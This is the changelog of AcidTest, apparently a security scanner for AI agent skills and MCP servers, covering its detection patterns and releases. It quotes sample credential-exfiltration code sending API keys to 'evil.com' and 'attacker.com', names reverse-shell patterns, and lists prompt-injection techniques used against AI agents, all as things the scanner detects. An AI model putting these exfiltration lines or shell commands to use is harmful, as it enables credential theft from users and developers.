# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [1.1.0] - 2026-09-05

2026 threat-model update. Adds detection for the agent-security attack
classes that emerged after the February 2026 pattern freeze, plus
repository hygiene. Backward compatible: no existing CLI flag or
scan-target behavior changed, and the only new command is `acidtest diff`.

### Added

- **30 new detection patterns across 6 new categories**, each with a
  corpus fixture and tests:
  - **MCP tool poisoning** (tp-001..006): instructions smuggled into tool
    and parameter descriptions, concealment directives, covert-channel
    parameter names.
  - **Cross-server shadowing / confused deputy** (cs-001..004): servers
    claiming to replace, intercept, or impersonate other tools.
  - **Credential exfil via MCP channels** (me-001..005): bulk environment
    harvesting and leaks through MCP resource/sampling channels.
  - **SKILL.md frontmatter injection** (fm-001..003): instruction-override
    attempts in description/trigger fields, executable frontmatter fields.
  - **Unicode/invisible-character obfuscation** (uo-001..006): zero-width
    characters, bidi/Trojan-Source overrides, U+E0000 tag characters,
    mixed-script homoglyphs.
  - **2026 prompt-injection vocabulary** (pi-011..016): fake
    system-reminder blocks, fake tool-call/result transcript blocks,
    embedded tool-call JSON, direct address to the reviewing AI, AI-audience
    callouts, claimed vendor provenance.
- **`acidtest diff <old> <new>`** — rug-pull update detection. Flags a new
  version that adds network/exec/credential capability absent from the old
  version; exits non-zero on a `RUG_PULL` verdict for CI gating.
- **Restructured `acidtest demo`** around the Q4-2026 attack classes
  (tool-poisoned MCP server, credential-exfil skill, invisible-Unicode
  payload, rug-pull pair), generated on demand and scanned with the real
  scanner — no fixtures shipped in the package.
- **Test corpus** (`test-corpus/`) committed and wired into
  `npm run test:corpus`, with a README documenting how the numbers are
  regenerated.
- **Real CI** (`.github/workflows/test.yml`): vitest + pattern validation
  on Node 20/22/24, making the README build badge reflect reality.
- **Daily-driver recipes** in the README: Claude Code PreToolUse install
  hook (`hooks/claude-code-preinstall.sh`), `scan-all ~/.claude/plugins`,
  watch-mode, and version-diff.

### Changed

- Injection findings on MCP servers are now labeled `MCP manifest` instead
  of `SKILL.md`.
- SKILL.md frontmatter is now scanned for injection (previously parsed only
  for permissions).
- Dependencies updated for a clean install: `glob` 13, `chalk` 6, plus
  dev-dependency bumps. Fresh `npm install` prints zero deprecation
  warnings and `npm audit` reports zero vulnerabilities.
- npm tarball trimmed to `dist` only — no longer ships `.github` or
  malicious-pattern test fixtures into consumers' `node_modules`.
- README refreshed: example output regenerated from a real scan, ClawHub
  section reframed as a timeless field-validation note, dead `acidtest.dev`
  links replaced with the live site and repo.

### Fixed

- Import patterns (di-001/004/005/006) now match ESM named imports
  (`import { execSync } from 'child_process'`), not only `require()` and
  dynamic `import()`.
- `npm run test:corpus` no longer fails with "No corpus files found" — the
  corpus directory it expects now exists and is committed.

### Quality

- 176 tests passing (was 115)
- 134 patterns validated across 19 category files
- Corpus: 12/12 vulnerable detected, 6/6 legitimate clean

### Removed

- Unregenerable claims: the fixed "~90-95% detection rate" is replaced with
  the corpus-backed result, and the stars/downloads README badges were
  dropped.

## [1.0.0] - 2026-02-08

**Production Release** - First stable release of AcidTest

### Phase 3.2: Pattern Expansion (2026-02-08)

**Major Feature:** Comprehensive security pattern coverage (104 patterns)

#### Added
- **25 New Security Patterns** across 6 new categories
  - SQL Injection (4 patterns): String concat, template literals, Python f-strings, execute formatting
  - XSS Injection (5 patterns): dangerouslySetInnerHTML, innerHTML, document.write, eval with HTML, location.href
  - Insecure Cryptography (7 patterns): MD5, SHA-1, weak random, hardcoded secrets, DES/3DES, ECB mode
  - Prototype Pollution (3 patterns): __proto__ access, constructor.prototype, unsafe merge
  - Python Deserialization (4 patterns): YAML unsafe load, XML without defusedxml, marshal.loads, jsonpickle
  - ReDoS (2 patterns): Nested quantifiers, overlapping alternatives

- **Remediation Guidance**: Each pattern includes actionable fix suggestions
  - TypeScript/JavaScript best practices
  - Python secure coding guidelines
  - Library recommendations (DOMPurify, defusedxml, cryptography)
  - Code examples for safe alternatives

#### Enhanced
- Pattern coverage: 79 → 104 patterns (+32%)
- Category coverage: 8 → 14 categories
- TypeScript patterns: 48 → 59
- Python patterns: 31 → 45
- All 104 patterns validated against JSON schema

#### Quality
- ✅ All 112 tests passing (no regressions)
- ✅ Pattern validation: 100% compliant
- ✅ Build succeeds with all new patterns
- ✅ IDs follow schema: category-NNN format

---

### Phase 3.1: Dataflow/Taint Analysis (2026-02-08)

**Major Feature:** Layer 5 - Multi-step attack detection via taint analysis

#### Added
- **Dataflow Analysis Engine**: Tracks data flow from sources to dangerous sinks
  - Dataflow graph construction from TypeScript AST
  - Worklist algorithm for taint propagation (O(N+E) complexity)
  - Path detection: Identifies source → sink paths through code
  - Confidence scoring: high/medium/low based on path complexity

- **Taint Sources** (where untrusted data originates):
  - Environment variables (`process.env.*`)
  - User input (function parameters, MCP tool args)
  - Network responses (`fetch()`, `axios()`)
  - Future: File reads

- **Taint Sinks** (dangerous operations):
  - Command execution (`exec`, `spawn`, `execSync`)
  - Code evaluation (`eval`, `Function` constructor)
  - Network requests (`fetch`, `axios`)
  - File writes (`fs.writeFile`)
  - Dynamic imports (`require`, `import()`)

- **Detection Capabilities** (v1.0.0 scope):
  - ✅ Direct taint flow: `const cmd = process.env.X; exec(cmd)`
  - ✅ Assignment chains: `const a = env.KEY; const b = a; exec(b)`
  - ✅ Property assignment: `obj.key = env.SECRET; send(obj.key)`
  - ✅ Object construction: `const cfg = {k: env.X}; send(cfg.k)`
  - ✅ Template literals: `const url = \`evil.com?key=\${env.KEY}\``
  - ✅ Property reads: `const cfg = {k: env.X}; const v = cfg.k`
  - ✅ Single-file analysis (no cross-file tracking in v1.0.0)

- **New Test Suite**: 20 comprehensive dataflow tests
  - Graph construction tests
  - Taint propagation tests
  - Path detection tests
  - Multi-step flow tests
  - Edge case handling
  - Total: 112 tests (92 → 112, +22%)

#### Examples Detected
```typescript
// Example 1: Environment variable exfiltration
const apiKey = process.env.OPENAI_API_KEY;
fetch('https://evil.com', { body: apiKey });  // CRITICAL: Detected

// Example 2: Multi-step command injection
const secret = process.env.SECRET;
const config = { key: secret };
const data = config.key;
exec(data);  // CRITICAL: Detected (4-step path)

// Example 3: Template literal exfiltration
const key = process.env.API_KEY;
const url = `https://attacker.com?key=${key}`;
fetch(url);  // CRITICAL: Detected
```

#### Architecture
- **Layer 5**: New dataflow analysis layer in scan pipeline
- **5 New Files**: dataflow-types, dataflow-graph, taint-propagation, layer integration, tests
- **Integration**: Seamless integration with existing 4-layer architecture
- **Performance**: O(N+E) complexity, minimal overhead

#### Limitations (Documented)
- ❌ Cross-file analysis (deferred to v1.1.0)
- ❌ Return value propagation across functions
- ❌ Async/Promise chain tracking
- ❌ Array operations
- ❌ Sanitizer detection
- ❌ Control flow sensitivity (if/else branches)

#### Quality
- ✅ All 112 tests passing (92 original + 20 dataflow)
- ✅ No regressions in existing functionality
- ✅ Build succeeds
- ✅ Corpus validation shows dataflow working

---

### Phase 2: Python Support (2026-02-08)

**Major Feature:** Full Python code analysis with tree-sitter

#### Added
- **Python Pattern Detection**: 31 new Python-specific security patterns
  - 17 dangerous import patterns (subprocess, pickle, ctypes, os, etc.)
  - 14 dangerous call patterns (eval, exec, shell=True, pickle.loads, etc.)
  - AST-based detection using tree-sitter-python v0.21.0
  - Detection for eval(), exec(), compile(), __import__()
  - subprocess with shell=True detection (CRITICAL severity)
  - Unsafe deserialization (pickle, marshal, shelve)
  - Command execution (os.system, os.popen, os.exec*/spawn*)
  - File operations (shutil.rmtree, os.remove, tempfile.mktemp)
  - Network modules (requests, urllib, httpx, socket)
  - Native code execution (ctypes, cffi)

- **Python AST Analysis**: Complete Python file parsing and analysis
  - Tree-sitter-based Python AST traversal
  - Function call detection with context (shell=True, SafeLoader, etc.)
  - Import statement analysis
  - Line-level finding reporting
  - Support for .py file extensions

- **Test Coverage**: 16 new Python-specific tests
  - Tests for eval(), exec(), compile(), __import__()
  - subprocess with/without shell=True
  - os.system(), pickle.loads(), yaml.load()
  - Network module imports (requests, socket)
  - Multiple dangerous patterns in single file
  - Safe Python code handling
  - Total: 92 tests (up from 76)

- **Test Corpus**: Python examples for validation
  - 5 vulnerable Python examples (exec, subprocess, eval, pickle, env exfiltration)
  - 2 legitimate Python examples (API client, file processor)
  - Validation script detects 100% of vulnerable Python code

#### Enhanced
- **Pattern Schema**: JSON Schema validation for all 79 patterns (48 TS + 31 Python)
- **Parser Architecture**: Abstracted parser interface for multi-language support
  - TypeScriptParser for .ts/.js files
  - PythonParser for .py files
  - Common ParsedFile interface

#### Validation Results
- **Vulnerable Python Detection**: 5/5 (100%)
- **Skills Scanned**: 55 OpenClaw skills
  - PASS: 39 (71%)
  - WARN: 3 (5%)
  - FAIL: 3 (5%)
  - DANGER: 9 (16%)
- **No TypeScript Regressions**: Existing TypeScript detection maintained
- **Pattern Tuning**: Network imports (requests/urllib) lowered to LOW severity for legitimate API usage

#### Internal
- Validation report: `internal/PYTHON-VALIDATION-RESULTS.md`
- Phase 1 handover: `internal/PHASE1-HANDOVER.md`
- Dataflow design: `src/analysis/DATAFLOW-DESIGN.md` (Phase 3)

## [0.8.0] - 2026-02-07

### Fixed
- **MCP Server Support**: Dramatically improved accuracy for MCP servers
  - Exclude TypeScript declaration files (.d.ts) from scanning
  - Skip test files (.spec.ts, .test.ts) from code analysis
  - Filter out legitimate import statements from path traversal detection
  - Skip "no declared permissions" warning for MCP servers (different permission model)
  - Skip permission mismatch checks for MCP servers (network/env/filesystem expected)
  - Reduce severity of legitimate API client patterns (fetch, process.env, base64, HTTP URLs)

- **False Positive Reduction**: Major improvements to detection accuracy
  - Path traversal now distinguishes between imports (`import from '../utils'`) and attacks
  - GitHub's official MCP server now scores 100/100 (was falsely flagged as DANGER)
  - Exa MCP server improved from 0/100 DANGER to 67/100 WARN
  - MCP servers are recognized as API clients with appropriate threat modeling

### Enhanced
- Better MCP manifest detection (`mcp.json`, `server.json`, `package.json`)
- MCP-aware scoring adjustments for legitimate API client behavior
- Smarter pattern matching reduces noise in scan results

## [0.7.0] - 2026-02-07

### Added
- **Watch Mode**: New `--watch` / `-w` flag for automatic re-scanning on file changes
  - Monitors skill directory for changes to code files and SKILL.md
  - Debounced file change detection (300ms)
  - Keyboard controls: `q` to quit, `r` to force re-scan, `c` to clear terminal
  - Optional `--no-clear` flag to preserve terminal history between scans
  - Works seamlessly with other flags (--json, --fix)

- **Remediation Suggestions**: New `--fix` flag shows actionable security guidance
  - Displays remediation suggestions for detected security issues
  - Integrated into pattern definitions (eval, child_process, dynamic require, etc.)
  - Provides specific, actionable steps to fix security vulnerabilities
  - Each pattern can include title, suggestions, and optional autofix capability

- **Progress Indicators**: Visual feedback during scans
  - Spinner shows progress through 4 scanning layers
  - Layer-specific status messages (permissions, injection, code analysis, cross-reference)
  - Automatic in CLI mode, disabled for JSON output and tests
  - Powered by ora for smooth terminal animations

- **Improved Terminal Output**: Better visualization of scan results
  - Summary table with severity counts and examples
  - Color-coded severity levels (CRITICAL/HIGH/MEDIUM/LOW/INFO)
  - Cleaner formatting with better visual hierarchy
  - Powered by cli-table3 for professional table rendering

- **Configuration File Support**: `.acidtest.json` for project-specific settings
  - **Ignore filters**: Suppress specific patterns, categories, or files
  - **Thresholds**: Set minimum scores or fail on specific severities
  - **Output preferences**: Control format, remediation display, and colors
  - Automatic discovery in skill directory
  - Graceful degradation on invalid/missing config

### Enhanced
- All 4 CLI improvements from Phase 1 roadmap fully implemented
- Test coverage increased to 63 tests (from 54)
- Better error handling and user feedback
- Cleaner code organization with new modules (watch.ts, config.ts)

## [0.6.0] - 2026-02-07

### Added
- **Test Suite**: Comprehensive test coverage using Vitest
  - 54 passing tests across core scanner, scoring, and code analysis layers
  - Unit tests for scoring calculations, status determination, and deduction capping
  - Integration tests for all test fixtures (PASS, WARN, FAIL, DANGER, entropy)
  - AST bypass detection tests (string concatenation, template literals, property access, Function constructor)
  - Enables confident refactoring and community contributions

- **Enhanced AST Bypass Detection**: Improved evasion resistance
  - **Function Constructor**: Detects `new Function(...)` (CRITICAL severity)
  - **Property Access Bypasses**: Catches bracket notation on sensitive objects like `global['child_process']` (MEDIUM severity)
  - **String Concatenation**: Explicitly flags `require('child_' + 'process')` (HIGH severity)
  - Better code comments explaining what each detection catches
  - All bypass patterns now have unique `patternId` for deduplication

- **Methodology Documentation**: New METHODOLOGY.md with transparent security approach
  - Honest assessment of detection capabilities (~85-90% success rate)
  - Clear documentation of known bypass techniques
  - Threat model and scope (what's in/out of scope)
  - When to use vs not use AcidTest
  - Comparison to other security tools
  - Recommendations for users, developers, and organizations

### Changed
- **AST Analysis**: Refactored `detectSuspiciousPatterns()` for better coverage
  - Now explicitly tracks 5 categories: eval, dynamic require, Function constructor, property access, string concatenation
  - Added evidence strings explaining why each pattern is dangerous
  - Improved code organization and readability

### Technical Notes
- Test infrastructure: Vitest with coverage support
- Test scripts: `npm test`, `npm run test:watch`, `npm run test:ui`, `npm run test:coverage`
- All tests pass on clean build
- No breaking changes to public API or CLI interface

## [0.5.3] - 2026-02-07

### Fixed
- **Entropy Detection False Positives**: Improved high-entropy string detection to reduce false positives
  - Now filters out JWT tokens (eyJ* format with proper structure)
  - Skips UUIDs (8-4-4-4-12 format)
  - Ignores hex hashes (MD5, SHA1, SHA256)
  - Filters legitimate base64 strings with proper padding
  - Reduces false positives while still catching actual obfuscation

- **Documentation**: Removed uncited third-party statistics from README
  - Replaced specific numbers with general security principles
  - Focuses on actual threats without unverifiable claims
  - More honest positioning about ecosystem risks

### Technical Notes
- Added `isLegitimateHighEntropyString()` function with pattern matching for known formats
- Base64 detection now requires padding or >100 char length to avoid flagging random strings
- All existing test fixtures still pass (no regressions)

## [0.5.2] - 2026-02-06

### Fixed
- **GitHub Actions Workflows**: Fixed CI failures on acidtest repository
  - Workflows now use local build (`npm install && npm run build`) when running on acidtest repo
  - Only scans PASS fixtures (`fixture-pass`, `fixture-mcp-pass`) in CI
  - Test fixtures designed to fail (fixture-fail, fixture-danger) no longer cause CI failures
  - Workflows still function correctly as templates for user repositories (use `npx acidtest@latest`)

### Changed
- Workflows build from source when detecting acidtest repository
- CI tests validate scanner works correctly without falsely failing on test cases

## [0.5.1] - 2026-02-06

### Fixed
- **JSON Error Handling**: When `--json` flag is used, errors now output valid JSON instead of stderr messages
  - Errors now return structured JSON: `{"status": "ERROR", "error": "message", ...}`
  - Fixes GitHub Actions workflows failing silently when no SKILL.md/MCP manifest found
  - Improves integration with CI/CD pipelines and programmatic usage
- **GitHub Actions Workflows**: Templates now work correctly on acidtest repository itself
  - Auto-detects acidtest repo and scans `test-fixtures` instead of root directory
  - Handles ERROR status properly in all workflow examples
  - Prevents workflow failures when running on the acidtest repository
  - Still functions correctly as templates for users to copy to their skill/MCP repos

### Changed
- Error output format when using `--json` flag is now consistent with scan results
- GitHub Actions workflows now serve dual purpose: testing acidtest + user templates

## [0.5.0] - 2026-02-06

### Added
- **GitHub Actions Integration**: CI/CD workflow templates for automated security scanning
  - `.github/workflows/acidtest-template.yml` - Production-ready template for copying to skill repos
  - `.github/workflows/acidtest-example.yml` - Comprehensive examples with multiple scan strategies
  - Supports pull request scanning, failure thresholds, bulk scanning, and PR comments
  - JSON output parsing for custom workflows
  - Artifact upload for scan results
- **Pre-Commit Hook**: Git hook template for local development workflows
  - `hooks/pre-commit` - Executable hook script with automatic install instructions
  - Blocks commits on DANGER status (configurable to block on FAIL)
  - Displays findings summary before commit
  - Auto-detects acidtest or uses npx if not installed
  - Bypass support with `--no-verify` flag
- **Documentation**: Comprehensive guides for CI/CD integration
  - `hooks/README.md` - Installation and configuration instructions
  - Multiple installation methods (copy, download, symlink)
  - Troubleshooting guide

### Changed
- README.md updated with CI/CD integration section
- Repository now includes reference workflows for community use

### Use Cases Unlocked
- Automated skill/MCP server scanning in GitHub Actions
- Pre-commit validation for developers
- Team/enterprise adoption via CI/CD pipelines
- Automatic PR rejection for malicious contributions

## [0.4.0] - 2026-02-06

### Added
- **Entropy-based Obfuscation Detection**: Shannon entropy analysis for string literals
  - Automatically calculates entropy for all string literals in code
  - Flags strings with entropy >4.5 as potential obfuscation (MEDIUM severity)
  - Smart filtering: skips URLs and short strings (<20 chars) to avoid false positives
  - Detects base64-encoded payloads, random character sequences, and encoded commands
  - Example detection: Base64 strings, hex-encoded data, minified obfuscated code
- Test fixture for entropy detection (`test-fixtures/fixture-entropy/`)

### Technical Details
- Shannon entropy formula: -Σ(p × log₂(p)) where p is character frequency
- Threshold: 4.5 (empirically determined to balance detection vs false positives)
- Minimum string length: 20 characters (shorter strings naturally have lower entropy)
- Implementation: AST-based analysis using TypeScript Compiler API

## [0.3.0] - 2026-02-06

### Added
- **New Attack Patterns**: 5 new detection patterns for broader threat coverage
  - `di-010`: npm/yarn/pnpm install in code (HIGH) - detects runtime package installation
  - `di-011`: git clone/pull/fetch operations (HIGH) - detects repository cloning attempts
  - `ex-007`: Reverse shell patterns (CRITICAL) - detects reverse shell commands (nc -e, /dev/tcp/, bash -i, socat)
  - `ex-008`: DNS lookup functions (MEDIUM) - detects potential DNS exfiltration
  - `ob-006`: Hex decoding (MEDIUM) - detects hex-based obfuscation techniques
- **Enhanced File Discovery**: Expanded ignore patterns to skip irrelevant files
  - Added `coverage/` - test coverage output directories
  - Added `*.min.js` and `*.min.mjs` - minified files (likely third-party)
  - Added `vendor/` - third-party vendor code
- **Documentation**: Added CONTRIBUTING.md and SECURITY.md
  - CONTRIBUTING.md provides clear guidelines for adding detection patterns
  - SECURITY.md establishes vulnerability reporting process and scope
  - Both files improve project professionalism and community engagement

### Fixed
- **Finding Deduplication**: Capped repeated pattern matches at 3 deductions per unique pattern
  - Prevents unfair score inflation when the same pattern triggers many times
  - Example: 50 fetch() calls now deduct 24 points (3 × 8) instead of 400 points (50 × 8)
  - More accurate risk assessment for skills with repetitive patterns

### Changed
- Pattern count: 43 → 48 detection patterns
- File scanning now excludes coverage reports, minified files, and vendor directories

## [0.2.2] - 2025-02-06

### Fixed
- Republished with correct dist/ build (0.2.1 had stale compiled code)

## [0.2.1] - 2025-02-06

### Fixed
- Updated version number in README example output to v0.2.0 (was showing v0.1.1)

## [0.2.0] - 2025-02-06

### Added
- **MCP Server Wrapper**: AcidTest can now run as an MCP (Model Context Protocol) server, allowing AI agents like Claude to scan skills and tools before installation
  - New `acidtest serve` command starts AcidTest in MCP server mode
  - Exposes two tools: `scan_skill` and `scan_all` for agent integration
  - Uses stdio transport for seamless integration with Claude Desktop and other MCP clients
- **MCP Manifest Scanning**: Extended scanning support to MCP server configurations
  - Automatically detects and parses `mcp.json`, `server.json`, `package.json` with MCP config, and `claude_desktop_config.json`
  - Maps MCP concepts (tools, transport, command, env) to existing permission model
  - Applies all four security layers to MCP servers
  - SSE transport automatically flagged as network access
- **Demo Command**: New `acidtest demo` command runs built-in test fixtures
  - Shows full output spectrum (PASS, WARN, FAIL, DANGER) in seconds
  - Perfect for evaluating AcidTest before use
  - Test fixtures now bundled in npm package

### Changed
- CLI help text updated to reflect MCP server and demo capabilities
- `scan` command now accepts MCP manifest files in addition to SKILL.md
- `scan-all` command now discovers both AgentSkills and MCP servers
- Package description updated to reflect broader scope

### Dependencies
- Added `@modelcontextprotocol/sdk` (^1.26.0) for MCP server functionality

### Documentation
- Updated README with MCP server usage and configuration examples
- Added MCP architecture section to BUILD-SPEC.md
- Updated ROADMAP with completed features

## [0.1.2] - 2025-02-06

### Added
- Schema versioning: JSON output now includes `schemaVersion: "1.0.0"` field for API stability
- Test fixtures suite in `test-fixtures/` with 4 baseline cases (PASS, WARN, FAIL, DANGER)
- ROADMAP.md documenting planned features and future enhancements

### Documentation
- Added cross-references between README, BUILD-SPEC, ROADMAP, and CHANGELOG
- Improved contributing guidelines and project navigation

## [0.1.1] - 2025-02-06

### Fixed
- Test files and fixtures are now properly excluded from scans to prevent false positives
- Permissions structure in JSON output is now consistently normalized as arrays
- Skills without declared permissions now return empty arrays instead of undefined fields

### Changed
- Extended glob ignore patterns to exclude common test directories (`__tests__`, `tests`, `*.test.*`, `*.spec.*`)
- Added exclusions for build artifacts (`.next`, `.nuxt`, `.vite*`, `.cache`)
- Permissions output now always includes `bins`, `env`, and `tools` as arrays

## [0.1.0] - 2025-02-06

### Added
- Initial release
- Four-layer security scanning (permissions, injection, code, cross-reference)
- Pattern-based detection system with 6 pattern categories
- TypeScript AST analysis for JavaScript/TypeScript code
- Terminal output with colored severity indicators
- JSON output mode for programmatic integration
- CLI commands: `scan` and `scan-all`
- Trust scoring algorithm (0-100 with PASS/WARN/FAIL/DANGER status)
- Detection for:
  - Prompt injection attempts
  - Undeclared network access
  - Shell execution without permissions
  - Credential harvesting
  - Path traversal
  - Obfuscated code
  - Permission mismatches
  - Deception indicators
